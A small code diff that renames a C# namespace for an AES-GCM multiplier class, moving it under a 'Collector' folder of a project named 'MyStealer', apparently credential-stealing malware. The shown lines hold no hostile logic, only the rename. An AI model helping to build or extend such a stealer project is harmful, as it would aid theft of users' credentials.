@@ -3,7 +3,7 @@ using System;
 using System.Runtime.Intrinsics.X86;
 #endif
 
-namespace MyStealer.Utils.BcAesGcm
+namespace MyStealer.Collector.Utils.BcAesGcm
 {
     [Obsolete("Will be removed")]
     public class BasicGcmMultiplier
